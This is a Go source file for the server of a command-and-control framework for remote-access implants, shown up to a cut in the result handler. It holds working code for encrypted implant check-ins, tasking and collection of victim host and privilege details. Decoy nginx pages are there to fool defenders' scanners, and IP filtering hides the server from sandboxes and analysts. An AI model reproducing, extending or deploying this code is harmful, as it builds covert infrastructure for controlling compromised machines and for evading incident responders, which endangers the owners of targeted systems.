package main

import (
        "crypto/aes"
        "crypto/cipher"
        "crypto/hmac"
        "crypto/rand"
        "crypto/sha256"
        "encoding/base64"
        "encoding/binary"
        "encoding/hex"
        "encoding/json"
        "fmt"
        "io"
        "log"
        "net"
        "net/http"
        "strings"
        "time"
        "unsafe"
        "os"
)

// ======================== SESSION CRYPTO (HKDF — matches Rust agent) ========================

type SessionCrypto struct {
        TrafficKey [32]byte
        MacKey     [32]byte
}

const hkdfInfo = "newclientc2-v1-derivation"

// NewSessionCrypto derives session keys via HKDF-Extract + HKDF-Expand
// Mirrors the Rust SessionCrypto::derive() exactly
func NewSessionCrypto(pskHex, saltHex string) (*SessionCrypto, error) {
        psk, err := getPSKBytes(pskHex)
        if err != nil {
                return nil, fmt.Errorf("psk decode: %v", err)
        }
        salt, err := hex.DecodeString(saltHex)
        if err != nil || len(salt) != 32 {
                return nil, fmt.Errorf("invalid salt: %v", err)
        }
        // HKDF-Extract: PRK = HMAC-SHA256(salt, PSK)
        prk := hkdfExtract(salt, psk)
        // HKDF-Expand to 128 bytes → 4 × 32B keys
        // order: traffic_key | sleep_key | task_key | mac_key
        okm := hkdfExpand(prk, []byte(hkdfInfo), 128)
        sc := &SessionCrypto{}
        copy(sc.TrafficKey[:], okm[0:32])
        // okm[32:64] = sleep_key (unused server-side)
        // okm[64:96] = task_key (future: task encryption)
        copy(sc.MacKey[:], okm[96:128])
        return sc, nil
}

// hkdfExtract: HMAC-SHA256(salt, ikm)
func hkdfExtract(salt, ikm []byte) []byte {
        if len(salt) == 0 {
                salt = make([]byte, 32)
        }
        mac := hmac.New(sha256.New, salt)
        mac.Write(ikm)
        return mac.Sum(nil)
}

// hkdfExpand: T(i) = HMAC-SHA256(PRK, T(i-1) | info | byte(i))
func hkdfExpand(prk, info []byte, n int) []byte {
        blocks := (n + 31) / 32
        okm := make([]byte, 0, n)
        prev := []byte{}
        for i := 1; i <= blocks; i++ {
                mac := hmac.New(sha256.New, prk)
                mac.Write(prev)
                mac.Write(info)
                mac.Write([]byte{byte(i)})
                t := mac.Sum(nil)
                remaining := n - len(okm)
                if remaining > 32 {
                        okm = append(okm, t...)
                } else {
                        okm = append(okm, t[:remaining]...)
                }
                prev = t
        }
        return okm
}

// EncryptToAgent: wire = [4B cipher_len][12B nonce][AES-GCM([32B HMAC][plaintext])]
// Mirrors decrypt_from_server in Rust
func (sc *SessionCrypto) EncryptToAgent(plaintext []byte) ([]byte, error) {
        // Prepend HMAC-SHA256(mac_key, plaintext)
        mac := hmac.New(sha256.New, sc.MacKey[:])
        mac.Write(plaintext)
        inner := make([]byte, 32+len(plaintext))
        copy(inner[:32], mac.Sum(nil))
        copy(inner[32:], plaintext)

        block, err := aes.NewCipher(sc.TrafficKey[:])
        if err != nil {
                return nil, err
        }
        gcm, err := cipher.NewGCM(block)
        if err != nil {
                return nil, err
        }
        nonce := make([]byte, 12)
        if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
                return nil, err
        }
        ct := gcm.Seal(nil, nonce, inner, nil)

        // Wire: [4B len][12B nonce][ct+tag]
        out := make([]byte, 4+12+len(ct))
        binary.BigEndian.PutUint32(out[:4], uint32(len(ct)))
        copy(out[4:16], nonce)
        copy(out[16:], ct)
        return out, nil
}

// DecryptFromAgent: reverse of encrypt_to_server in Rust.
// Both sides now use random 12-byte nonce — symmetric and safe (no nonce reuse).
func (sc *SessionCrypto) DecryptFromAgent(wire []byte) ([]byte, error) {
        if len(wire) < 4+12+16 {
                return nil, fmt.Errorf("too short: %d bytes", len(wire))
        }
        cipherLen := binary.BigEndian.Uint32(wire[:4])
        if uint32(len(wire)) != 4+12+cipherLen {
                return nil, fmt.Errorf("length mismatch: got %d, expected %d", len(wire), 4+12+cipherLen)
        }
        nonce := wire[4:16]
        ct := wire[16:]

        block, err := aes.NewCipher(sc.TrafficKey[:])
        if err != nil {
                return nil, err
        }
        gcm, err := cipher.NewGCM(block)
        if err != nil {
                return nil, err
        }
        decrypted, err := gcm.Open(nil, nonce, ct, nil)
        if err != nil {
                return nil, err
        }
        // HMAC layer is mandatory — reject short messages (was: silently accept)
        if len(decrypted) < 32 {
                return nil, fmt.Errorf("HMAC layer missing: %d bytes", len(decrypted))
        }
        mac := hmac.New(sha256.New, sc.MacKey[:])
        mac.Write(decrypted[32:])
        if !hmac.Equal(mac.Sum(nil), decrypted[:32]) {
                return nil, fmt.Errorf("HMAC mismatch")
        }
        return decrypted[32:], nil
}

// getPSKBytes: only accepts a 64-hex-char PSK (= 32 raw bytes of full entropy).
//
// ── S-M2 FIX: Reject weak PSKs instead of silently padding/truncating ──
// The OLD code accepted ANY input: if it wasn't 64 hex chars, it just
// copy()'d the raw bytes into a 32-byte buffer (padding with zeros or
// truncating). For a short passphrase like "password" (8 chars) this
// produced a 32-byte buffer with only 8 bytes of real entropy + 24 zero
// bytes — equivalent to an 8-byte PSK. Brute-force cost dropped from
// 2^256 to 2^64. A weak PSK must FAIL HARD so the operator is forced to
// regenerate it, not be silently weakened to a bruteforceable value.
func getPSKBytes(keyStr string) ([]byte, error) {
        if len(keyStr) != 64 {
                return nil, fmt.Errorf("PSK must be exactly 64 hex chars (32 bytes), got %d chars — regenerate with a strong PSK", len(keyStr))
        }
        b, err := hex.DecodeString(keyStr)
        if err != nil {
                return nil, fmt.Errorf("PSK hex decode failed: %v", err)
        }
        if len(b) != 32 {
                // Should never happen (hex.DecodeString(64 chars) → 32 bytes),
                // but defensive: a future regression in stdlib shouldn't silently
                // pass a short key.
                return nil, fmt.Errorf("PSK must decode to 32 bytes, got %d", len(b))
        }
        return b, nil
}

// computePSKHash: SHA256(PSK bytes) → hex, matches agent's psk_hash_hex()
//
// ── S-M2 companion fix: if getPSKBytes now rejects the input, we return
// the empty string. Callers compare against a stored psk_hash, so an
// invalid PSK simply never matches any stored hash → safe failure mode
// (no session authenticated, no false positive).
func computePSKHash(keyStr string) string {
        psk, err := getPSKBytes(keyStr)
        if err != nil {
                return ""
        }
        h := sha256.Sum256(psk)
        // Wipe the PSK bytes from heap (best-effort) — we only need the hash now.
        for i := range psk {
                psk[i] = 0
        }
        return hex.EncodeToString(h[:])
}

// resolveSessionByCrypto finds the session whose crypto can decrypt the wire.
//
// Wire format:
//   Heartbeat/result/rekey: first 8 bytes = session_id prefix (ASCII hex)
//   followed by the actual encrypted payload.
//
// O(1) fast path:  read 8-byte prefix → map lookup → verify with 1 decrypt.
// O(n) fallback:   if prefix lookup fails, scan all sessions (handles old agents
//                  or prefix collision — extremely rare with UUID session IDs).
//
// The prefix is NOT secret (session_id is given to agent in checkin_ack).
// It merely allows O(1) routing — actual auth is the AES-GCM tag on decrypt.
func resolveSessionByCrypto(wire []byte) *Session {
        const prefixLen = 8 // 8 ASCII hex chars = first 4 bytes of UUID

        // ── O(1) fast path: session_id prefix lookup ──────────────────────
        // Encrypted heartbeats from new agents include an 8-char session ID
        // prefix prepended before the encrypted payload.
        //
        // BUGFIX (was: fatal double-RUnlock): the old code unlocked INSIDE the
        // loop, then `break` on decrypt-failure fell through to the outer
        // RUnlock — an unbalanced RUnlock drives sync.RWMutex readerCount
        // negative → unrecoverable fatal("sync: RUnlock of unlocked RWMutex")
        // killing the whole server. Now: find the candidate under the lock,
        // unlock ONCE, decrypt outside the lock.
        if len(wire) > prefixLen {
                candidatePrefix := string(wire[:prefixLen])
                var cand *Session
                sessionMgr.mu.RLock()
                for id, s := range sessionMgr.sessions {
                        if s.Crypto == nil || !s.Active {
                                continue
                        }
                        if strings.HasPrefix(id, candidatePrefix) {
                                cand = s
                                break
                        }
                }
                sessionMgr.mu.RUnlock()

                if cand != nil {
                        // Verify with actual decrypt (prefix is routing hint, not auth)
                        actualWire := wire[prefixLen:]
                        if _, err := cand.Crypto.DecryptFromAgent(actualWire); err == nil {
                                return cand
                        }
                        // Prefix matched but decrypt failed — fall through to scan
                }
        }

        // ── O(n) fallback: scan all active sessions ───────────────────────
        // Handles: agents without prefix (old format), prefix collision,
        // or wire without prefix prepended.
        sessionMgr.mu.RLock()
        candidates := make([]*Session, 0, 8)
        for _, s := range sessionMgr.sessions {
                if s.Crypto == nil || !s.Active {
                        continue
                }
                candidates = append(candidates, s)
        }
        sessionMgr.mu.RUnlock()

        // Try full wire first (no prefix)
        for _, s := range candidates {
                if _, err := s.Crypto.DecryptFromAgent(wire); err == nil {
                        return s
                }
        }
        // Try stripping prefix (in case prefix is present but O(1) path missed)
        if len(wire) > prefixLen {
                actualWire := wire[prefixLen:]
                for _, s := range candidates {
                        if _, err := s.Crypto.DecryptFromAgent(actualWire); err == nil {
                                return s
                        }
                }
        }
        return nil
}

// stripSessionPrefix — remove the 8-byte session ID prefix from wire data if present.
// Returns the actual encrypted payload.
func stripSessionPrefix(wire []byte) []byte {
        const prefixLen = 8
        if len(wire) > prefixLen {
                return wire[prefixLen:]
        }
        return wire
}

// handleC2Rekey — agent re-checkins after heartbeat failures.
// Derives new crypto from same PSK + new salt, reactivates session.
func handleC2Rekey(w http.ResponseWriter, s *Session, env *AgentEnvelope) {
        var rekeyData struct {
                Salt    string `json:"salt"`
                PSKHash string `json:"psk_hash"`
        }
        if err := json.Unmarshal(env.Data, &rekeyData); err != nil {
                w.WriteHeader(http.StatusBadRequest)
                return
        }
        var matchedPSK string
        // Layer 1: listener RAM
        if l := listenerMgr.FindListenerByPSKHash(rekeyData.PSKHash); l != nil {
                matchedPSK = l.PSKHex
        }
        // Layer 2: global key
        if matchedPSK == "" && computePSKHash(serverConfig.EncryptionKey) == rekeyData.PSKHash {
                matchedPSK = serverConfig.EncryptionKey
        }
        // Layer 3: agent_db (server restart recovery)
        if matchedPSK == "" && agentStore != nil {
                if rec, ok := agentStore.GetByPSKHash(rekeyData.PSKHash); ok {
                        matchedPSK = rec.PSKHex
                        if rec.ListenerID != "" {
                                listenerMgr.SetListenerPSK(rec.ListenerID, rec.PSKHex)
                        }
                }
        }
        if matchedPSK == "" {
                w.WriteHeader(http.StatusUnauthorized)
                return
        }
        crypto, err := NewSessionCrypto(matchedPSK, rekeyData.Salt)
        if err != nil {
                w.WriteHeader(http.StatusInternalServerError)
                return
        }
        sessionMgr.mu.Lock()
        s.Crypto = crypto
        s.Active = true
        s.LastSeen = time.Now().UTC()
        sessionMgr.mu.Unlock()
        wireTasks := buildWireTasks(sessionMgr.GetPendingTasks(s.ID))
        respEnv := ServerEnvelope{
                MsgType:   "rekey_ack",
                SessionID: s.ID,
                Data: ServerResponseData{
                        SessionID: s.ID,
                        Tasks:     wireTasks,
                        FastPoll:  len(wireTasks) > 0,
                },
                Ts: time.Now().Unix(),
        }
        sendEncryptedResponse(w, crypto, respEnv)
        log.Printf("[C2] Rekey OK: %s — crypto refreshed", s.ID[:8])
}

// ======================== WIRE TYPES ========================

// AgentEnvelope matches Rust comms::Envelope
type AgentEnvelope struct {
        MsgType   string          `json:"type"`
        SessionID string          `json:"session_id"`
        Data      json.RawMessage `json:"data"`
        Ts        int64           `json:"ts"`
}

// AgentCheckinData matches Rust comms::CheckinReq
type AgentCheckinData struct {
        SessionID  string  `json:"session_id"`
        Hostname   string  `json:"hostname"`
        Username   string  `json:"username"`
        OS         string  `json:"os"`
        Arch       string  `json:"arch"`
        PID        uint32  `json:"pid"`
        IsAdmin    bool    `json:"is_admin"`
        // v9: agent-reported ground truth for the dashboard. IP is what the
        // AGENT sees on its own NICs (the server-side clientIP is the
        // redirector's when a pivot is in path); Process/Parent identify the
        // hosting process (explorer.exe etc. after injection, else "none" at
        // display time); Privs = system|admin|user.
        InternalIP string  `json:"internal_ip"`
        Process    string  `json:"process"`
        Parent     string  `json:"parent_process"`
        Privs      string  `json:"privs"`
        Salt       string  `json:"salt"`
        PSKHash    string  `json:"psk_hash"`
        TrustScore int     `json:"trust_score"`
        SleepTime  int     `json:"sleep_time"`
        Jitter     float64 `json:"jitter"`
}

// ServerEnvelope — response envelope to agent
type ServerEnvelope struct {
        MsgType   string      `json:"type"`
        SessionID string      `json:"session_id"`
        Data      interface{} `json:"data"`
        Ts        int64       `json:"ts"`
}

// ServerResponseData matches Rust comms::ServerResponse
type ServerResponseData struct {
        SessionID string     `json:"session_id"`
        Tasks     []WireTask `json:"tasks"`
        FastPoll  bool       `json:"fast_poll"`
}

// WireTask matches Rust comms::WireTask exactly
type WireTask struct {
        ID      string          `json:"id"`
        Type    string          `json:"type"`
        Command string          `json:"command"`
        Args    json.RawMessage `json:"args"`
}

// WireInlineArgs matches Rust tasks::InlineArgs
type WireInlineArgs struct {
        Command string `json:"command"`
        Args    string `json:"args"`
        Path    string `json:"path"`
}

// AgentTaskResult matches Rust comms::TaskResultWire
type AgentTaskResult struct {
        TaskID  string `json:"task_id"`
        Output  string `json:"output"` // base64-encoded
        Error   string `json:"error"`  // base64-encoded
        Success bool   `json:"success"`
}

// ======================== END OF C2 PROTOCOL ========================

// ======================== ROUTE SETUP ========================

func SetupAgentRoutes(mux *http.ServeMux) {
        // ── Unified C2 endpoint (Rust agent — current format) ─────────────
        mux.HandleFunc("POST /api/v1/c2-endpoint", handleAgentC2)

        // ── Decoy: GET on C2 path → nginx 404 (no C2 fingerprint) ────────
        mux.HandleFunc("GET /api/v1/c2-endpoint", handleDecoy404)

        // ── Decoy routes that look like a real nginx web server ───────────
        // Blue team scanners and passive crawlers hitting these get realistic
        // responses that give no indication a C2 is running.
        mux.HandleFunc("GET /index.html", handleDecoy200)
        mux.HandleFunc("GET /", handleDecoy200)
        mux.HandleFunc("GET /favicon.ico", handleDecoyFavicon)
        mux.HandleFunc("GET /robots.txt", handleDecoyRobots)

        // Catch-all for any other path → nginx 404
        mux.HandleFunc("POST /", handleDecoy404)

        // NOTE: Legacy routes (/agent/checkin, /agent/result, /agent/tasking)
        // have been REMOVED. They used weaker auth and exposed agent paths.
        // All agents must use /api/v1/c2-endpoint (current Rust agent format).
}

// handleDecoy200 — realistic nginx default page for GET /
func handleDecoy200(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Type", "text/html; charset=utf-8")
        w.Header().Set("Server", "nginx/1.24.0")
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.WriteHeader(http.StatusOK)
        w.Write([]byte(`<!DOCTYPE html>
<html>
<head><title>Welcome to nginx!</title>
<style>body{width:35em;margin:0 auto;font-family:Tahoma,Verdana,Arial,sans-serif;}</style></head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>
<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>
<p><em>Thank you for using nginx.</em></p>
</body>
</html>`))
}

// handleDecoyFavicon — empty favicon (prevents 404 log spam from browsers)
func handleDecoyFavicon(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Type", "image/x-icon")
        w.Header().Set("Cache-Control", "max-age=604800")
        w.WriteHeader(http.StatusOK)
        // Minimal valid ICO file (1x1 transparent pixel)
        w.Write([]byte{0,0,1,0,1,0,1,1,0,0,1,0,1,0,40,0,0,0,40,0})
}

// handleDecoyRobots — realistic robots.txt
func handleDecoyRobots(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Type", "text/plain; charset=utf-8")
        w.WriteHeader(http.StatusOK)
        w.Write([]byte(`User-agent: *
Disallow:
`))
}

// handleDecoy404 — returns a realistic nginx 404 page for any unrecognised request.
// This prevents passive fingerprinting via response body / structure.
func handleDecoy404(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Type", "text/html; charset=utf-8")
        w.WriteHeader(http.StatusNotFound)
        w.Write([]byte(`<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.24.0</center>
</body>
</html>`))
}

// ======================== UNIFIED C2 ENDPOINT ========================

func handleAgentC2(w http.ResponseWriter, r *http.Request) {
        // BUGFIX: IP filter was only enforced on plain check-in — encrypted
        // heartbeat/result traffic from a blocklisted IP was fully served.
        // ip_filter.go contract: "Call IsAllowedIP before processing ANY
        // agent request" — now enforced on the whole C2 endpoint.
        if !IsAllowedIP(r.RemoteAddr) {
                log.Printf("[C2] BLOCKED agent request from %s (IP filter)", r.RemoteAddr)
                w.WriteHeader(http.StatusForbidden)
                return
        }

        body, err := io.ReadAll(r.Body)
        if err != nil {
                w.WriteHeader(http.StatusBadRequest)
                return
        }

        // Try plain JSON first (initial checkin is unencrypted)
        var env AgentEnvelope
        if err := json.Unmarshal(body, &env); err == nil && env.MsgType != "" {
                switch env.MsgType {
                case "checkin":
                        handleC2Checkin(w, r, &env)
                default:
                        log.Printf("[C2] Unknown plain msg_type: %s", env.MsgType)
                        w.WriteHeader(http.StatusBadRequest)
                }
                return
        }

        // Binary / encrypted — O(1) lookup via resolveSessionByCrypto.
        // Scales to 100+ agents — prefix-based O(1) routing, O(n) fallback.
        session := resolveSessionByCrypto(body)
        if session != nil {
                // Try full body first, then prefix-stripped (handles both formats)
                plain, err := session.Crypto.DecryptFromAgent(body)
                if err != nil {
                        // Try stripping 8-byte session prefix (new agent format)
                        if len(body) > 8 {
                                plain, err = session.Crypto.DecryptFromAgent(body[8:])
                        }
                }
                if err != nil {
                        log.Printf("[C2] Decrypt failed for %s: %v", session.ID[:8], err)
                        w.WriteHeader(http.StatusUnauthorized)
                        return
                }
                var inner AgentEnvelope
                if json.Unmarshal(plain, &inner) != nil {
                        log.Printf("[C2] Decrypt OK but bad JSON from %s", session.ID[:8])
                        w.WriteHeader(http.StatusBadRequest)
                        return
                }
                switch inner.MsgType {
                case "heartbeat":
                        handleC2Heartbeat(w, session, &inner)
                case "result":
                        handleC2Result(w, session, &inner)
                case "rekey":
                        handleC2Rekey(w, session, &inner)
                default:
                        log.Printf("[C2] Unknown encrypted msg_type: %s", inner.MsgType)
                        w.WriteHeader(http.StatusBadRequest)
                }
                return
        }

        // DEBUG: No session could decrypt this message
        log.Printf("[C2] WARNING: Cannot resolve session for encrypted msg from %s (%d bytes) — crypto mismatch or no active sessions", r.RemoteAddr, len(body))
        w.WriteHeader(http.StatusUnauthorized)
}

// handleC2Checkin — processes initial checkin (plain JSON Envelope)
func handleC2Checkin(w http.ResponseWriter, r *http.Request, env *AgentEnvelope) {
        var checkin AgentCheckinData
        if err := json.Unmarshal(env.Data, &checkin); err != nil {
                log.Printf("[C2] Bad checkin data: %v", err)
                w.WriteHeader(http.StatusBadRequest)
                return
        }

        // IP filter gate — LAST line of defense.
        // If inbound IP is a known datacenter/VPN/Tor/sandbox range,
        // silently drop (no response). Agent times out naturally.
        if !IsAllowedIP(r.RemoteAddr) {
                log.Printf("[IP-FILTER] Blocked checkin from %s (datacenter/VPN/sandbox IP)", r.RemoteAddr)
                // Do NOT write any response — silent drop
                return
        }

        // ══════════════════════════════════════════════════════════════════
        // PSK LOOKUP — 3 layer fallback
        //
        // Layer 1: In-memory listener PSK   (fast path — normal operation)
        // Layer 2: Global server key         (legacy / fallback)
        // Layer 3: agent_db/psk_store.json  (server restart recovery ← FIX)
        //
        // Server restart karne ke baad listener.PSKHex RAM mein nahi hota.
        // Layer 3 disk se PSK load karta hai — crypto mismatch solve.
        // ══════════════════════════════════════════════════════════════════
        var matchedPSK string

        // Layer 1: Active listener ke RAM mein PSK dhundo
        matchedListener := listenerMgr.FindListenerByPSKHash(checkin.PSKHash)
        if matchedListener != nil {
                matchedPSK = matchedListener.PSKHex
                log.Printf("[C2] PSK matched listener (RAM): %s", matchedListener.Name)
        }

        // Layer 2: Global server encryption key
        if matchedPSK == "" {
                if computePSKHash(serverConfig.EncryptionKey) == checkin.PSKHash {
                        matchedPSK = serverConfig.EncryptionKey
                        log.Printf("[C2] PSK matched global server key")
                }
        }

        // Layer 3: Persistent store (agent_db/psk_store.json)
        // Server restart ke baad yahan se recover hota hai
        restoredListenerID := "" // v9.1: transport recovery after psk_store match
        if matchedPSK == "" && agentStore != nil {
                if rec, ok := agentStore.GetByPSKHash(checkin.PSKHash); ok {
                        matchedPSK = rec.PSKHex
                        restoredListenerID = rec.ListenerID
                        log.Printf("[C2] PSK recovered from agent_db (post-restart): agent=%s listener=%s",
                                rec.AgentName, rec.ListenerName)
                        // Listener ke RAM mein bhi restore karo — next checkin faster hoga
                        if rec.ListenerID != "" {
                                listenerMgr.SetListenerPSK(rec.ListenerID, rec.PSKHex)
                        }
                }
        }

        if matchedPSK == "" {
                // BUGFIX: was checkin.PSKHash[:8] — a short/empty psk_hash panicked
                // here (slice bounds) and turned a clean 401 into a 500 + stack trace.
                h := checkin.PSKHash
                if len(h) > 8 {
                        h = h[:8]
                }
                log.Printf("[C2] PSK mismatch from %s (hash=%s) — not in RAM, global key, or agent_db",
                        r.RemoteAddr, h)
                w.WriteHeader(http.StatusUnauthorized)
                return
        }

        // Derive session crypto from the MATCHED PSK + agent-provided salt
        crypto, err := NewSessionCrypto(matchedPSK, checkin.Salt)
        if err != nil {
                log.Printf("[C2] Crypto derive failed: %v", err)
                w.WriteHeader(http.StatusInternalServerError)
                return
        }

        // ════════════════════════════════════════════════════════════════════════
        // SECURITY HARDENING (Task A — memory dump defense)
        // ════════════════════════════════════════════════════════════════════════
        //
        // Zero the matchedPSK string contents in memory immediately after the
        // session crypto has been derived from it. The PSK was either:
        //   - Layer 1 (listener RAM PSK) — still cached in listener object, but
        //     that's a separate concern (listener cache is for normal operation)
        //   - Layer 2 (global server key) — never goes away, can't be zeroed
        //   - Layer 3 (vault.db on-demand decrypt) — was briefly in RAM for
        //     THIS checkin only; we zero it now to minimize exposure window
        //
        // The SessionCrypto object holds the derived keys (different from PSK)
        // so it's safe to keep around. The matchedPSK string's bytes, however,
        // are no longer needed and SHOULD NOT linger in heap.
        //
        // Note: Go strings are immutable, so we can't truly zero them. But we
        // can overwrite the underlying byte slice via unsafe pointer manipulation
        // — this works for short-lived strings that don't escape to other
        // goroutines. Since matchedPSK is a local variable, this is safe.
        //
        // For Layer 1 + 2 paths, matchedPSK is a copy of the source string —
        // zeroing it doesn't affect the source. For Layer 3, the source IS
        // the on-demand-decrypted buffer, which vaultDiskGetEntry already
        // wiped after returning. So this zeroing is belt-and-suspenders.
        zeroPSKInMemory(&matchedPSK)

        // Get client IP from RemoteAddr.
        // v10 FIX: when the teamserver sits behind nginx/Apache/Caddy, r.RemoteAddr
        // is the proxy's IP (always the redirector) and we lose the real source.
        // Honour X-Forwarded-For (chain: client, proxy1, proxy2) and X-Real-IP
        // when present so the dashboard chain shows the actual attacker path:
        //   agent private → agent public (trueip) → true redirector → C2.
        // OPSEC FIX (audit Cloud BUG 3+6): Only trust X-Forwarded-For from
        // TRUSTED PROXIES. The OLD code blindly trusted the leftmost XFF
        // hop — any agent could spoof `X-Forwarded-For: 1.2.3.4` and fake
        // its session IP. Also, the IP filter only checked r.RemoteAddr
        // (the proxy's IP, always allowed) — real agent IP in XFF was
        // never checked → sandbox IPs sailed through behind a redirector.
        // NEW: only honor XFF if r.RemoteAddr is in the trusted proxies list
        // (C2_TRUSTED_PROXIES env, comma-separated). If not a trusted proxy,
        // use r.RemoteAddr as the client IP (don't trust XFF).
        clientIP, _, _ := net.SplitHostPort(r.RemoteAddr)
        trustedProxies := strings.Split(os.Getenv("C2_TRUSTED_PROXIES"), ",")
        isTrustedProxy := false
        for _, proxy := range trustedProxies {
                proxy = strings.TrimSpace(proxy)
                if proxy != "" && (clientIP == proxy || strings.HasPrefix(clientIP, proxy)) {
                        isTrustedProxy = true
                        break
                }
        }
        if isTrustedProxy {
                // Only trust XFF from a known redirector — prevents spoofing
                if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
                        // Comma-separated chain; leftmost is the original client.
                        if i := strings.IndexByte(xff, ','); i >= 0 {
                                clientIP = strings.TrimSpace(xff[:i])
                        } else {
                                clientIP = strings.TrimSpace(xff)
                        }
                } else if xri := r.Header.Get("X-Real-IP"); xri != "" {
                        clientIP = strings.TrimSpace(xri)
                }
        }
        // If not a trusted proxy, clientIP stays as r.RemoteAddr —
        // the IP filter will check it. Behind a non-trusted redirector,
        // the redirector's IP is checked (which should be in the allowlist).

        // OPSEC FIX (audit Cloud BUG 6): Also IP-filter the derived clientIP.
        // The check at line ~568 only checks r.RemoteAddr (the redirector's
        // IP, always in the allowlist). If we trusted XFF from a trusted proxy,
        // the real agent IP is in clientIP — check it against the blocklist
        // to catch sandbox IPs that ride through a legit redirector.
        if isTrustedProxy && clientIP != "" {
                if !IsAllowedIP(clientIP + ":0") { // IsAllowedIP expects host:port format
                        log.Printf("[IP-FILTER] Blocked checkin from %s (XFF-derived real IP — datacenter/VPN/sandbox)", clientIP)
                        w.WriteHeader(http.StatusNotFound)
                        return
                }
        }

        // Atomic find-or-create under single lock (fixes race condition)
        listenerID := ""
        listenerProto := "" // v9: Transport column (https/tcp/...)
        if matchedListener != nil {
                listenerID = matchedListener.ID
                listenerProto = matchedListener.Protocol
        }
        // v9.1 FIX: reconnect used to leave Transport "—". When the PSK
        // matched via the global-key or psk_store layer, matchedListener is
        // nil even though we KNOW which listener the payload belongs to.
        // Fallback chain: RAM listener → psk_store-restored listener → the
        // live request's own TLS state (agent beacons are https/tcp; the C2
        // leg seen here is TLS when the chain rides https end to end).
        if listenerProto == "" && restoredListenerID != "" {
                if l := listenerMgr.GetListener(restoredListenerID); l != nil {
                        listenerID = l.ID
                        listenerProto = l.Protocol
                }
        }
        if listenerProto == "" {
                if r.TLS != nil {
                        listenerProto = "https"
                } else {
                        listenerProto = "http"
                }
                log.Printf("[C2] Transport fallback: no listener match — inferring '%s' from the request", listenerProto)
        }
        agentSleep := 60
        agentJitter := 0.2
        if checkin.SleepTime > 0 {
                agentSleep = checkin.SleepTime
        }
        if checkin.Jitter > 0 {
                agentJitter = checkin.Jitter
        }

        sessionID, _ := sessionMgr.FindOrCreateSession(
                checkin.Hostname, checkin.Username, checkin.OS, checkin.Arch,
                clientIP, int(checkin.PID), agentSleep, agentJitter,
                crypto, listenerID,
                checkin.InternalIP, checkin.Process, checkin.Parent, checkin.Privs,
                listenerProto,
        )

        // Get any pending tasks (none for fresh session usually)
        wireTasks := buildWireTasks(sessionMgr.GetPendingTasks(sessionID))

        // v9.1: automatic True IP discovery — if the dashboard chain's middle
        // hop is still unknown, have the beacon resolve it itself via the
        // whitelisted `trueip` inline task (throttled 1/10min inside).
        sessionMgr.QueueTrueipOnce(sessionID)

        // Build response: Envelope wrapping ServerResponseData
        respEnv := ServerEnvelope{
                MsgType:   "checkin_ack",
                SessionID: sessionID,
                Data: ServerResponseData{
                        SessionID: sessionID,
                        Tasks:     wireTasks,
                        FastPoll:  len(wireTasks) > 0,
                },
                Ts: time.Now().Unix(),
        }
        sendEncryptedResponse(w, crypto, respEnv)
        log.Printf("[C2] Checkin OK: %s (%s@%s / %s) tasks=%d", sessionID[:8], checkin.Username, checkin.Hostname, checkin.OS, len(wireTasks))
}

// handleC2Heartbeat — agent alive ping, return pending tasks
func handleC2Heartbeat(w http.ResponseWriter, s *Session, _ *AgentEnvelope) {
        if !sessionMgr.UpdateSession(s.ID) {
                log.Printf("[C2] Heartbeat from %s — session NOT FOUND (deleted?)", s.ID[:8])
                w.WriteHeader(http.StatusNotFound)
                return
        }
        wireTasks := buildWireTasks(sessionMgr.GetPendingTasks(s.ID))

        // v9.1: retry True IP discovery on long-lived sessions too (throttle
        // inside makes this a no-op until 10 min have passed since the last
        // attempt, and it stops entirely once PublicIP is known).
        sessionMgr.QueueTrueipOnce(s.ID)

        respEnv := ServerEnvelope{
                MsgType:   "heartbeat_ack",
                SessionID: s.ID,
                Data: ServerResponseData{
                        SessionID: s.ID,
                        Tasks:     wireTasks,
                        FastPoll:  len(wireTasks) > 0,
                },
                Ts: time.Now().Unix(),
        }
        sendEncryptedResponse(w, s.Crypto, respEnv)
        log.Printf("[C2] Heartbeat OK: %s (%s@%s) checkin#%d tasks=%d", s.ID[:8], s.Username, s.Hostname, s.CheckinNum, len(wireTasks))
}

// handleC2Result — task results from agent
func handleC2Result(w http.ResponseWriter, s *Session, env *AgentEnvelope) {
        var results []AgentTaskResult
        if err := json.Unmarshal(env.Data, &results); err != nil {
                log.Printf("[C2] Bad result data: %v", err)
                w.WriteHeader(http.StatusBadRequest)
                return
        }
        // Agent sent results = it's alive. Update LastSeen so GUI shows ALIVE not SLEEPING.
        sessionMgr.UpdateSession(s.ID)

        // OPSEC FIX (audit Cloud BUG 7): Cap task result size to prevent
        // memory exhaustion. A rogue or compromised agent could send a 100MB+
        // base64 result → 75MB raw → stored in sessionMgr → broadcast via WS
        // → operator client WsService.java OOM. Cap at 10MB (base64 encoded =
        // ~13.3MB). Truncate with a marker so the operator knows data was cut.
        const maxResultBytes = 10 * 1024 * 1024 // 10MB
        const maxB64Len = (maxResultBytes * 4 + 2) / 3 // base64 expansion factor

        for _, res := range results {
                var output string
                if len(res.Output) > maxB64Len {
                        // Truncate the base64 BEFORE decoding — decoding a
                        // partial base64 would produce garbage bytes.
                        truncatedB64 := res.Output[:maxB64Len]
                        output = b64Decode(truncatedB64) +
                                fmt.Sprintf("\n[TRUNCATED: result %d bytes > %d cap — full output discarded]",
                                        len(res.Output), maxResultBytes)
                        log.Printf("[C2] WARN: session %s task %s result %d bytes truncated to %d",
                                s.ID[:8], res.TaskID, len(res.Output), maxResultBytes)
                } else {
                        output = b64Decode(res.Output)
                }
                if !res.Success && res.Error != "" {
                        errStr := b64Decode(res.Error)
                        if output != "" {
                                output += "\n[ERR] " + errStr
                        } else {
                                output = "[ERR] " + errStr
                        }
                }
                sessionMgr.CompleteTask(s.ID, res.TaskID, output)
        }
        w.Header().Set("Content-Type", "application/json")
        w.Write([]byte(`{"status":"received"}`))
        log.Printf("[C2] Results: %d task(s) from %s", len(results), s.ID[:8])
